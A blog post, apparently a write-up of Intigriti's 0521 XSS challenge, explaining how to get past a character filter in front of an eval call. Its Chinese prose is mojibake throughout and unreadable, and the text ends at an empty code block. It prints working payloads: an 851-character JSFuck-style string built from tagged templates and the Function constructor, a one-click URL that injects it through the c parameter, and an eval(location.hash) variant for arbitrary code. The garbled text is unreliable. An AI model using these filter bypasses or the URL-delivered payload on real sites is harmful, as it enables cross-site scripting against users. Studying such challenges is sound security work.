---
title: Intigritiâ€™s 0521 XSS æŒ‘æˆ°è§£æ³•ï¼šé™å®šå­—å…ƒçµ„åˆç¨‹å¼ç¢¼
catalog: true
date: 2021-06-07 21:34:09
tags: [Security, Front-end]
categories:
  - Security
---

## å‰è¨€

[Intigriti](https://www.intigriti.com/) æ˜¯åœ‹å¤–çš„ä¸€å€‹ bug bounty å¹³å°ï¼Œæ¯å€‹æœˆéƒ½æœƒæ¨å‡ºä¸€å€‹ XSS æŒ‘æˆ°ï¼Œæœ‰å¤§ç´„ä¸€åˆ°å…©é€±çš„æ™‚é–“å¯ä»¥å»æ€è€ƒï¼Œç›®æ¨™æ˜¯åœ¨ç‰¹å®šç¶²ç«™ä¸Šé¢åŸ·è¡Œ `alert(document.domain)`ï¼Œè§£å‡ºä¾†ä¹‹å¾ŒæŠŠçµæœé€é Intigriti å¹³å°å›å ±ï¼Œæœ€å¾Œæœƒéš¨æ©ŸæŠ½ 3 å€‹è§£æ‰çš„äººå¾—åˆ°ä»–å€‘è‡ªå·±å•†åº—çš„å„ªæƒ åˆ¸ã€‚

ä¸Šå€‹æœˆçš„æŒ‘æˆ°å› ç‚ºè§£å‡ºä¾†çš„äººä¸å¤šï¼Œæ‰€ä»¥æˆ‘æœ‰å¹¸é‹æŠ½åˆ° 50 æ­å…ƒçš„å„ªæƒ åˆ¸ï¼Œå…¶å¯¦å¾ˆåˆ’ç®—ï¼Œå› ç‚ºå•†åº—è³£çš„æ±è¥¿å…¶å¯¦éƒ½æ»¿ä¾¿å®œçš„ï¼Œæˆ‘è²·äº†ä¸€ä»¶ t-shirt + å…©é ‚å¸½å­å†åŠ åœ‹éš›é‹è²»ï¼Œå¤§æ¦‚ 45 æ­å…ƒå·¦å³ã€‚

ä¸éé€™ç¨®çå“å°±æ˜¯é é‹æ°£å•¦ï¼Œé‚„æ˜¯è§£é¡Œå¥½ç©æ¯”è¼ƒé‡è¦ã€‚

æŒ‘æˆ°ç¶²å€åœ¨é€™é‚Šï¼šhttps://challenge-0521.intigriti.io/

<!-- more -->

## ç¨‹å¼ç¢¼åˆ†æ

![](https://i.imgur.com/JTXv9w4.png)

è§£é¡Œçš„ç¬¬ä¸€æ­¥å°±æ˜¯åˆ†æä¸€ä¸‹å®ƒçš„ç¨‹å¼ç¢¼ï¼Œå…ˆäº†è§£ä¸€ä¸‹é€™æ•´å€‹é¡Œç›®çš„é‹ä½œç‚ºä½•ã€‚é¦–é é€™ä¸€é çœ‹èµ·ä¾†æ²’ä»€éº¼æ±è¥¿ï¼Œæ¯”è¼ƒå€¼å¾—æ³¨æ„çš„åªæœ‰ä¸€å€‹ç¶²å€æ˜¯ `./captcha.php` çš„ iframeï¼Œç›´æ¥ä¾†çœ‹çœ‹è£¡é¢æ˜¯ä»€éº¼ï¼š

``` html
<body>
    <form id="captcha">
        <div id="input-fields">
          <span id="a"></span>
          <span id="b">+</span>
          <input id="c" type="text" size="4" value="" required/>
          =
          <span id="d"></span>
          <progress id="e" value="0" max="100" style="display:none"></progress>
        </div>
          <input type="submit" id="f"/>
          <input type="button" onclick="setNewNumber()" value="Retry" id="g"/>
    </form>
</body>
<script>
    const a = document.querySelector("#a");
    const c = document.querySelector("#c");
    const b = document.querySelector("#b");
    const d = document.querySelector("#d");

    window.onload = function(){
      setNewNumber();
      document.getElementById("captcha").onsubmit = function(e){
          e.preventDefault();
          loadCalc(0);
      };
    }

    function loadCalc(pVal){
      document.getElementsByTagName("progress")[0].style.display = "block";
      document.getElementsByTagName("progress")[0].value = pVal;
      if(pVal == 100){
        calc();
      }
      else{
        window.setTimeout(function(){loadCalc(pVal + 1)}, 10);
      }
    }

    function setNewNumber() {
            document.getElementsByTagName("progress")[0].style.display = "none";
        var dValue = Math.round(Math.random()*1000);
        d.innerText = dValue;
        a.innerText = Math.round(Math.random()* dValue);
    }

    function calc() {
        const operation = a.innerText + b.innerText + c.value;
        if (!operation.match(/[a-df-z<>()!\\='"]/gi)) { // Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant)
            if (d.innerText == eval(operation)) {
              alert("ğŸš«ğŸ¤– Congratulations, you're not a robot!");
            }
            else {
              alert("ğŸ¤– Sorry to break the news to you, but you are a robot!");
            }
            setNewNumber();
        }
        c.value = "";
    }

</script>
```

é€™é‚Šæœ‰å¹¾å€‹ inputï¼Œç„¶å¾Œä½¿ç”¨è€…æŒ‰ä¸‹é€å‡ºæ™‚æœƒæŠŠè¼¸å…¥çš„ c.value ä¸Ÿåˆ° eval å»åŸ·è¡Œï¼Œä½†æœ‰é™å®šå­—å…ƒï¼Œä¸èƒ½ä½¿ç”¨ï¼š`a-df-z<>()!\='"`ï¼Œåœ¨è‹±æ–‡å­—æ¯è£¡é¢åªæœ‰ e æ˜¯å¯ä»¥ç”¨çš„ã€‚

å› æ­¤é€™é¡Œçš„ç›®æ¨™å°±å¾ˆæ˜é¡¯äº†ï¼Œæ˜¯è¦ç¹éé€™å€‹å­—å…ƒçš„é™åˆ¶ï¼Œç„¶å¾Œé€éé‚£å€‹ eval å¹«æˆ‘å€‘åŸ·è¡Œ `alert(document.domain)`

## å…¨é¢å•Ÿå‹•

ï¼ˆå…ˆå¯«åœ¨å‰é¢ï¼Œé€™ç¯‡çš„ç¨‹å¼ç¢¼ä½ æœƒçœ‹åˆ°æœ‰äº› ` æ˜¯ç”¨å…¨å½¢ï¼Œé€™æ˜¯å› ç‚ºä¸é€™æ¨£çš„è©± markdown parser æœƒå£æ‰ï¼‰

æœ‰é—œç¹éå­—å…ƒé™åˆ¶ï¼Œä¹‹å‰æˆ‘æœ‰å¯«äº†ä¸€ç¯‡ï¼š[å¦‚ä½•ä¸ç”¨è‹±æ–‡å­—æ¯èˆ‡æ•¸å­—å¯«å‡º console.log(1)ï¼Ÿ](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/)ï¼Œæ²’æƒ³åˆ°é€™æ¬¡å°±æ´¾ä¸Šç”¨å ´äº†ã€‚

èˆ‰ä¾‹ä¾†èªªï¼Œ`0/0` å¯ä»¥ç”¢ç”Ÿ `NaN`ï¼Œæ‰€ä»¥ `` `${0/0}`[1] `` å°±å¯ä»¥æ‹¿åˆ°å­—ä¸² aã€‚åªè¦ç”¨é¡ä¼¼çš„æŠ€å·§ï¼Œæ‡‰è©²å°±å¯ä»¥ç”¢ç”Ÿå‡ºæˆ‘å€‘æƒ³è¦çš„æ‰€æœ‰å­—å…ƒã€‚

ä½†é€™é¡Œé›£çš„åœ°æ–¹æˆ‘è¦ºå¾—ä¸åœ¨é€™ï¼Œè€Œæ˜¯ä¸€é–‹å§‹åœ¨æ€è€ƒé€™é¡Œçš„æ™‚å€™è…¦è¢‹å®¹æ˜“æ‰“çµï¼Œå› ç‚ºæœƒåˆ†ä¸å¤ªæ¸…æ¥šä»€éº¼ç¨‹å¼ç¢¼æœƒç›´æ¥è¢«åŸ·è¡Œï¼Œä»€éº¼ç¨‹å¼ç¢¼åˆä¸æœƒã€‚

èˆ‰ä¾‹ä¾†èªªï¼Œå°±ç®—è²»ç›¡åƒè¾›è¬è‹¦æ‹¼å‡ºäº†ç›®æ¨™å­—ä¸²å¥½äº†ï¼Œä¸Ÿåˆ° eval å»ä¹‹å¾Œå…¶å¯¦çµæœè·Ÿä½ æƒ³åƒä¸­ä¸å¤ªä¸€æ¨£ï¼Œå› ç‚ºçµæ§‹å¤§æ¦‚æœƒåƒé€™æ¨£ï¼š`eval('"a"+"l"+"e"+"r"+"t"+"(1)"')`

æœ€å¾Œçš„çµæœæœƒæ˜¯å­—ä¸²ï¼š`alert(1)`ï¼Œè€Œä¸æ˜¯ç›´æ¥åŸ·è¡Œ alert(1)ï¼Œå› ç‚ºä½ åœ¨åšçš„åªæ˜¯æŠŠæƒ³åŸ·è¡Œçš„ç¨‹å¼ç¢¼æ‹¼å‡ºä¾†ï¼Œè€Œ eval åªæ˜¯å¹«ä½ æ‹¼èµ·ä¾†è€Œå·²ã€‚é‚£å¦‚æœå†æŠŠ eval æ‹¼å‡ºä¾†å‘¢ï¼Ÿ

`eval('"eval(a"+"l"+"e"+"r"+"t"+"(1))"'`

é€™æ¨£ä¹Ÿæ˜¯æ²’ç”¨çš„ï¼Œä¹Ÿåªæœƒå‡ºç¾å­—ä¸²çš„ eval è€Œå·²ã€‚ä¹‹æ‰€ä»¥é€™æ¨£ä¸è¡Œï¼Œæ˜¯å› ç‚ºä½ æ‹¼çš„æ±è¥¿æ˜¯å­—ä¸²ä¸­çš„å­—ä¸²ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œè«‹çœ‹ä¸‹é¢é€™å…©æ®µç¨‹å¼ç¢¼ï¼š

`eval('alert(1)')`
`eval('"alert(1)"')`

å‰è€…æœƒè·³å‡º alertï¼Œå¾Œè€…æœƒè¼¸å‡ºå­—ä¸² alertã€‚é€™å°±æ˜¯å› ç‚ºå¾Œè€…æ˜¯ï¼šã€Œå­—ä¸²ä¸­çš„å­—ä¸²ã€ã€‚å¦‚æœç”¨å­—ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œå°±ä¸€å®šæœƒé€™æ¨£ã€‚

æ‰€ä»¥å¦‚æœéœ€è¦åŸ·è¡Œç¨‹å¼ç¢¼çš„è©±ï¼Œæˆ‘å€‘ä¸€å®šè¦æœ‰ä¸€äº›æ±è¥¿æ˜¯ä¸éœ€è¦æ‹¼æ¥çš„ï¼Œåœ¨ JS è£¡é¢å¯ä»¥æŠŠå­—ä¸²ç•¶ä½œç¨‹å¼ç¢¼åŸ·è¡Œçš„æœ‰ï¼š

1. eval
2. function constructor
3. setTimeout
4. setInterval
5. location

é€™è£¡é¢ç¬¦åˆæˆ‘å€‘éœ€æ±‚çš„ï¼Œå°±æ˜¯ function constructor äº†ï¼

ç‚ºä»€éº¼é€™æ¨£èªªå‘¢ï¼Ÿå› ç‚ºæˆ‘å€‘å¯ä»¥ä¸ç›´æ¥é€éå­—ä¸²å­˜å–åˆ°é€™å€‹æ±è¥¿ï¼å…ˆç°¡å–®è¬›ä¸€ä¸‹ function constructorï¼Œå°±æ˜¯ `Function()` é€™å€‹æ±è¥¿ï¼Œå¯ä»¥å‹•æ…‹ç”¢ç”Ÿå‡½å¼ã€‚

ç„¶å¾Œ `Function` å°±æ˜¯ `Function.prototype.constructor`ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ prototype chain åŠ ä¸Šé™£åˆ—ä¾†å­˜å–åˆ°ï¼š`[]['constructor']['constructor'] === Function // true`

æœ‰äº†é€™å€‹ä¹‹å¾Œï¼Œå°±å¯ä»¥å‹•æ…‹å»ºç«‹ function ä¸¦ä¸”åŸ·è¡Œäº†ï¼

åƒé€™æ¨£ï¼š`[]['constructor']['constructor']('alert(1)')()`

é‚£ç‚ºä»€éº¼é€™æ¨£å­æ”¾é€² eval ä¹‹å¾Œå°±å¯ä»¥å‘¢ï¼Ÿå› ç‚º `[]` ä¸¦ä¸æ˜¯ç”¨å­—ä¸²çµ„æˆçš„ï¼Œæ‰€ä»¥æ”¾é€² eval æœƒæ˜¯é€™æ¨£ï¼š`eval("[]['constructor']['constructor']('alert(1)')()")`

é€™æ¨£ä¸€ä¾†ï¼Œå°±å¯ä»¥åœ¨ eval è£¡é¢é€é function constructor å»å‹•æ…‹åŸ·è¡Œç¨‹å¼ç¢¼äº†ï¼Œé€™å°±æ˜¯é€™å€‹ç« ç¯€çš„æ¨™é¡Œã€Œå…¨é¢å•Ÿå‹•ã€çš„æ„æ€ï¼Œä¸€å±¤é‚„æœ‰ä¸€å±¤ã€‚

ä¸éé™¤äº†è¦æ‰¾å‡ºæ›¿ä»£å­—ä¸²ä»¥å¤–ï¼Œé‚„æœ‰ä¸€å€‹å•é¡Œï¼Œé‚£å°±æ˜¯å‡½å¼å‘¼å«ä¸èƒ½ä½¿ç”¨ `()`ï¼Œé€™è©²æ€éº¼è¾¦å‘¢ï¼Ÿ

## Tagged templates

æœ‰ç”¨é React ä¸­çš„ styled components çš„è©±ï¼Œå°é€™å€‹èªæ³•æ‡‰è©²ä¸é™Œç”Ÿï¼š

``` js
const Box = styled.div`
  background: red;
`
```

å…¶å¯¦ `styled.div` æ˜¯ä¸€å€‹ functionï¼Œç„¶å¾Œç”¨åå¼•è™Ÿä¾†å‘¼å« functionã€‚æ²’éŒ¯ï¼Œåå¼•è™Ÿä¹Ÿæ˜¯å¯ä»¥å‘¼å«å‡½å¼çš„ï¼Œä½†è¦æ³¨æ„çš„æ˜¯åƒæ•¸çš„å‚³éæœƒè·Ÿä½ æƒ³çš„ä¸å¤ªä¸€æ¨£ã€‚

ç›´æ¥åšå€‹ç°¡å–®ç¤ºç¯„å°±çŸ¥é“äº†ï¼š


``` js
function noop(...args) {
  console.log(args)
}

noop`1` // [["1"]]
noop`${'abc'}`// [["", ""], "abc"]
noop`1${'abc'}2` // [["1", "2"], "abc"]
noop`1${'a'}2${'b'}3${'c'}` // [["1", "2", "3", ""], "a", "b", "c"]
```

ç”¨åå¼•è™Ÿä¾†å‘¼å«å‡½å¼çš„è©±ï¼Œç¬¬ä¸€å€‹åƒæ•¸æœƒæ˜¯ä¸€å€‹é™£åˆ—ï¼Œè£¡é¢æ˜¯æ‰€æœ‰ä¸€èˆ¬çš„å­—ä¸²ï¼Œéš”é–‹çš„æ¨™æº–æ˜¯ä¸­é–“æœ‰ `${}`ï¼Œè€Œæ¥ä¸‹ä¾†ç¬¬äºŒå€‹åƒæ•¸ä»¥å¾Œéƒ½æ˜¯ä½ æ”¾åœ¨ `${}` è£¡çš„å…§å®¹ã€‚

æ›´å¤šç¯„ä¾‹å¯åƒè€ƒï¼š[[ç­†è¨˜] JavaScript ES6 ä¸­çš„æ¨¡ç‰ˆå­—ç¬¦ä¸²ï¼ˆtemplate literalsï¼‰å’Œæ¨™ç±¤æ¨¡ç‰ˆï¼ˆtagged templateï¼‰](https://pjchender.blogspot.com/2017/01/javascript-es6-template-literalstagged.html)

æŠŠæˆ‘å€‘ä¸Šé¢çš„ç¨‹å¼ç¢¼ç”¨åå¼•è™Ÿæ”¹å¯«æœƒè®Šé€™æ¨£ï¼š

``` js
[]['constructor']['constructor']`${'alert(1)'}``ï½€
```

ä½†é€™æ¨£çš„è©±å¦‚æœä½ ä¸Ÿå»åŸ·è¡Œï¼Œæœƒç™¼ç¾æœ‰éŒ¯ã€‚å› ç‚ºæ ¹æ“šæˆ‘å€‘ä¸Šé¢æ‰€èªªçš„ï¼Œé€™æ¨£å¯«çš„è©±å‚³å» function constructor çš„åƒæ•¸æœƒæ˜¯ï¼š`[""], 'alert(1)'`ï¼Œç¬¬ä¸€å€‹åƒæ•¸æ˜¯ä¸€å€‹å«æœ‰ç©ºå­—ä¸²çš„é™£åˆ—ã€‚

è€Œ function constructor é™¤äº†æœ€å¾Œä¸€å€‹åƒæ•¸ä¹‹å¤–ï¼Œå…¶ä»–éƒ½æœƒè¢«ç•¶ä½œè¦å‹•æ…‹æ–°å¢çš„å‡½å¼çš„åƒæ•¸ï¼Œä¾‹å¦‚èªª `Function('a', 'b', 'return a+b')` å°±æ˜¯ï¼š

``` js
function (a, b) {
  return a+b
}
```

æ‰€ä»¥ç¬¬ä¸€å€‹åƒæ•¸çµ¦ç©ºå­—ä¸²æ˜¯è¡Œä¸é€šçš„ï¼ŒåŠ ä¸€å€‹è®Šæ•¸å°±è¡Œäº†ï¼Œä¾‹å¦‚èªªé¡Œç›®å…è¨±çš„ e æˆ–è€…æ˜¯ _ï¼š

``` js
[]['constructor']['constructor']`_${'alert(1)'}``ï½€

// ç”¢ç”Ÿå‡ºçš„å‡½å¼
function anonymous(_,) {
  alert(1)
}
```

é€™æ¨£å°±èƒ½é †åˆ©åŸ·è¡Œç¨‹å¼ç¢¼äº†ï¼Œå› æ­¤æœ€å¾Œå‰©ä¸‹çš„å°±åªæœ‰æ‹¼å‡º `constructor` è·Ÿ `alert(document.domain)` äº†

## å­—ä¸²æ‹¼æ‹¼æ¨‚

é™¤äº†æˆ‘é–‹é ­æåˆ°çš„æ–‡ç« ï¼š[å¦‚ä½•ä¸ç”¨è‹±æ–‡å­—æ¯èˆ‡æ•¸å­—å¯«å‡º console.log(1)ï¼Ÿ](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/)ä¹‹å¤–ï¼Œ[jsfuck](https://github.com/aemkei/jsfuck/blob/master/jsfuck.js) çš„ç¨‹å¼ç¢¼ä¹Ÿæœ‰å¾ˆå¤šå¯ä»¥åƒè€ƒçš„åœ°æ–¹ã€‚

åº•ä¸‹æ˜¯æˆ‘ç”¨çš„å¹¾å€‹ï¼š

``` js
1. `${``+{}}` => "[object Object]"
2. `${``[0]}` => "undefined"
3. `${e}` => "[object HTMLProgressElement]"
4. `${0/0}` => "NaN"
```

æˆ‘å€‘å¯ä»¥å¾ä¸Šé¢é€™äº›çµ„åˆä¸­ï¼Œæ‰¾åˆ°æ‰€æœ‰éœ€è¦çš„å­—å…ƒã€‚æ¥ä¸‹ä¾†åªå·®æœ€å¾Œå…©å€‹äº†ï¼Œå°±æ˜¯ `()`ï¼Œæˆ‘å€‘å¿…é ˆä¹Ÿç”¨æ‹¼çš„æ‹¼å‡ºé€™å…©å€‹å­—å…ƒæ‰è¡Œã€‚

é€™è¦æ€éº¼æ‹¿åˆ°å‘¢ï¼Ÿåœ¨ JS è£¡é¢æŠŠ function è®Šæˆå­—ä¸²çš„è©±ï¼Œå°±æœƒæ˜¯æ•´å€‹ function çš„å…§å®¹ï¼Œåƒé€™æ¨£ï¼š

``` js
`${[]['constructor']}`
=> "function Array() { [native code] }"
```

å¯ä»¥é€éé€™æ¨£å­æ‹¿åˆ°é€™è£¡é¢çš„ `()` é€™å…©å€‹å­—å…ƒã€‚

çµåˆä»¥ä¸Šçš„æŠ€å·§ï¼Œæˆ‘è‡ªå·±å¯«äº†ä¸€å€‹ç°¡å–®çš„å°ç¨‹å¼å»ç”¢å‡ºæœ€çµ‚çš„çµæœï¼š

``` js
const mapping = {
  a: '`${0/0}`[1]',
  c: '`${``+{}}`[5]',
  d: '`${``[0]}`[2]',
  e: '`e`',
  i: '`${``[0]}`[5]',
  l: '`${e}`[21]',
  m: '`${e}`[23]',
  n: '`${``[0]}`[1]',
  o: '`${``+{}}`[1]',
  r: '`${e}`[13]',
  s: '`${e}`[18]',
  t: '`${``+{}}`[6]',
  u: '`${``[0]}`[0]',
  ".": '`.`'
}

function getString(str) {
  return str.split('').map(c => mapping[c] || 'error:' + c).join('+')
}

const cons = getString('constructor')
mapping['('] = '`${[][' + cons + ']}`[14]'
mapping[')'] = '`${[][' + cons + ']}`[15]'

const ans = 
  "[][" + 
  getString('constructor') + 
  "]["+
  getString('constructor') +
  "]`_${" + 
  getString('alert(document.domain)') +
  "}```"

console.log(ans)
```

output(é•·åº¦ 851):

``` js
[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`${0/0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${``+{}}`[6]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${``[0]}`[2]+`${``+{}}`[1]+`${``+{}}`[5]+`${``[0]}`[0]+`${e}`[23]+`e`+`${``[0]}`[1]+`${``+{}}`[6]+`.`+`${``[0]}`[2]+`${``+{}}`[1]+`${e}`[23]+`${0/0}`[1]+`${``[0]}`[5]+`${``[0]}`[1]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}`` `
```

æŠŠä¸Šé¢é€™æ•´ä¸²è²¼åˆ°ç¶²é ä¸Šçš„ input ç„¶å¾ŒæŒ‰ä¸‹æäº¤ï¼Œå°±æœƒçœ‹åˆ° alert è·³å‡ºä¾†å›‰ï¼

![](https://i.imgur.com/Rn4HYRZ.png)

åšåˆ°é€™é‚Šä¹‹å¾Œæˆ‘å°±å¾ˆé–‹å¿ƒåœ°å»é€ç­”æ¡ˆï¼Œçµæœå¾—åˆ°äº†ä¸€å€‹å›è¦†ï¼Œè·Ÿæˆ‘èªªé€™æ˜¯ self-XSSï¼Œæç¤ºæˆ‘èªªå¯ä»¥å¤šå¾€ php é‚£é‚Šå»ç ”ç©¶ä¸€é»ã€‚

æ²’éŒ¯ï¼Œæˆ‘éƒ½å¿˜è¨˜é€™æ˜¯ä¸€å€‹ self-XSS äº†ï¼Œå› ç‚ºéœ€è¦è‡ªå·±æŠŠé€™ä¸² payload è²¼åœ¨ input ä¸Šé¢é€å‡ºï¼Œå°±æœ‰é»åƒæ˜¯ä½¿ç”¨è€…å¿…é ˆè‡ªå·±æŠŠæƒ¡æ„ç¨‹å¼ç¢¼è²¼éä¾†ä¸€æ¨£ï¼Œé€™ç¨®é€šå¸¸æ²’è¾¦æ³•æ§‹æˆå…·æœ‰åš´é‡æ€§çš„æ¼æ´ã€‚

å› æ­¤æˆ‘å°±å¾€ PHP é‚£é‚Šå»çœ‹ï¼Œéš¨ä¾¿è©¦äº†ä¸€ä¸‹ç™¼ç¾ `c=xxx` çš„å…§å®¹æœƒç›´æ¥åæ˜ åœ¨ c.value ä¸Šï¼Œæ‰€ä»¥åªè¦æŠŠä¸Šé¢é‚£ä¸€ä¸²æ”¾åˆ°ç¶²å€ä¸Šé¢å»å°±å¥½äº†ï¼Œè®Šæˆï¼š

```
https://challenge-0521.intigriti.io/captcha.php?c=[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]`_${`${0/0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${``%2b{}}`[6]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${``%2b{}}`[5]%2b`${``[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${``[0]}`[1]%2b`${``%2b{}}`[6]%2b`.`%2b`${``[0]}`[2]%2b`${``%2b{}}`[1]%2b`${e}`[23]%2b`${0/0}`[1]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]}``+`
```

é€™æ¨£å­ä½¿ç”¨è€…é»äº†ç¶²å€ä¹‹å¾Œ payload å°±æœƒè‡ªå‹•å¡«å¥½ï¼Œåªè¦æŒ‰æŒ‰éˆ•å°±å¯ä»¥è§¸ç™¼ã€‚æ–¼æ˜¯æˆ‘å€‘æŠŠ self-XSS è®Šæˆäº† one-click XSSï¼Œé»å€‹æŒ‰éˆ•å°±æœƒä¸­æ‹›ã€‚

åšåˆ°é€™é‚Šå…¶å¯¦å°±é€šéé€™é¡Œäº†ï¼Œä½†å› ç‚ºé‚„æœ‰æ™‚é–“ï¼Œæ‰€ä»¥æˆ‘é‚„æƒ³å†ç ”ç©¶æ›´å¤šæ±è¥¿ã€‚

## åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼

åªæ˜¯åŸ·è¡Œå›ºå®šçš„ç¨‹å¼ç¢¼ä¸å¤ªå¥½ç©ï¼Œæœ‰æ²’æœ‰å¯èƒ½åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ï¼Ÿåƒæ˜¯é€™ç¨®ä»»æ„ç¨‹å¼ç¢¼åŸ·è¡Œé€šå¸¸éƒ½æœƒé€éå¹¾å€‹æ–¹æ³•æŠŠç¨‹å¼ç¢¼å¸¶é€²å»ï¼Œä¾‹å¦‚èªªï¼š

1. window.name
2. iframe + top.name
3. location.hash

é€™é‚Šå‰å…©è€…éƒ½éœ€è¦è‡ªå·±å†åšå¦ä¸€å€‹ç¶²é ï¼Œåªæœ‰ location.hash ä¸éœ€è¦ï¼Œå› æ­¤é€™é‚Šå°±å…ˆä»¥é€™å€‹ä½œæ³•ç‚ºä¸»å§ï¼

æˆ‘å€‘éœ€è¦æ¹Šå‡ºçš„å­—ä¸²æ˜¯ï¼š

``` js
[]['constructor']['constructor']`_${'eval(location.hash.slice(1))'}`` `
```

é€™æ¨£åªè¦è®“ç¶²å€æœ€å¾Œé¢æ˜¯ï¼š`#alert(document.domain)`ï¼Œå°±å¯ä»¥é”æˆä¸€æ¨£çš„æ•ˆæœäº†ã€‚

æ–°çš„å­—å…ƒçµ„åˆï¼Œç¼ºå°‘çš„åªæœ‰å…©å€‹ï¼šv è·Ÿ hã€‚

é€™å…©å€‹å…¶å¯¦ä¸å¤ªå¥½æ‰¾ï¼Œå› ç‚ºæ¯”è¼ƒå¥½æ‰¾çš„å·²ç¶“éƒ½è¢«æˆ‘å€‘æ‰¾å®Œäº†ã€‚é‚£é‚„æœ‰å“ªè£¡å¯ä»¥æ‰¾å‘¢ï¼Ÿ

é¦–å…ˆæ˜¯ v çš„éƒ¨åˆ†ï¼Œå…¶å¯¦å¯ä»¥æŠŠåŸç”Ÿçš„ function è®Šæˆ stringï¼Œå°±èƒ½æ‹¿åˆ° `[native code]` é€™å€‹å­—ä¸²ã€‚ä½†æ˜¯åœ¨ Chrome ä¸Šèˆ‡ Firefox ä¸Šçš„è¼¸å‡ºä¸å¤ªä¸€æ¨£ï¼Œä»¥ RegExp ç‚ºä¾‹ï¼Œ

Chrome çš„è¼¸å‡ºæ˜¯ï¼š`function RegExp() { [native code] }`
Firefox çš„è¼¸å‡ºæ˜¯ï¼š`function RegExp() {\n    [native code]\n}`

Firefox çš„è¼¸å‡ºæœƒæ›è¡Œè€Œ Chrome ä¸æœƒï¼Œé€™å°±é€ æˆäº†å­—å…ƒ index çš„å·®ç•°ï¼Œæ‰€ä»¥æ²’è¾¦æ³•è·¨ç€è¦½å™¨å–å¾— v é€™å€‹å­—ã€‚ä¸éæˆ‘å€‘å…ˆä¸ç®¡é€™å€‹ï¼Œå…ˆä¾†çœ‹ h å¥½äº†ã€‚

h ä¸€æ¨£ä¹Ÿæ˜¯ä¸å®¹æ˜“å–å¾—ï¼Œä½†å¦‚æœæˆ‘å€‘èƒ½çµ„å‡ºï¼š`` 17['toString']`36` ``ï¼Œå…¶å¯¦å°±èƒ½æ‹¿åˆ° hã€‚

å› ç‚ºä¸Šé¢çš„ç¨‹å¼ç¢¼å°±æ˜¯æŠŠ 17 é€™å€‹æ•¸å­—è½‰æˆ 36 é€²ä½ï¼Œé€™æ¨£å°±å¯ä»¥æ‹¿åˆ° hï¼Œå› ç‚º h æ˜¯ç¬¬ 8 å€‹è‹±æ–‡å­—æ¯ï¼ˆ9 å€‹æ•¸å­— + ç¬¬ 8 å€‹è‹±æ–‡å­—æ¯ = 17ï¼‰ã€‚

é‚£é€™å€‹å¤§å¯«çš„ S æ€éº¼æ‹¿å‘¢ï¼ŸString constructor å¯ä»¥æ‹¿åˆ°ï¼š

``` js
``['constructor'] + ''
// output
// "function String() { [native code] }"
```

è€Œä¸”ä¸€æ—¦æˆ‘å€‘å¯ä»¥ç”¨ toString çš„é€™å€‹æŠ€å·§ï¼Œå…¶å¯¦ä»»ä½•å°å¯«è‹±æ–‡å­—æ¯éƒ½å¯ä»¥æ‹¿åˆ°äº†ï¼Œç•¶ç„¶ä¹ŸåŒ…å«å‰é¢æ‰€èªªçš„ vã€‚

è©³ç´°éç¨‹æˆ‘å°±ä¸ç¤ºç¯„äº†ï¼ŒæŠŠç¨‹å¼æ”¹ä¸€ä¸‹å°±å¥½ï¼Œæœ€å¾Œçš„çµæœæ˜¯ï¼ˆ1925 å€‹å­—ï¼‰ï¼š

``` js
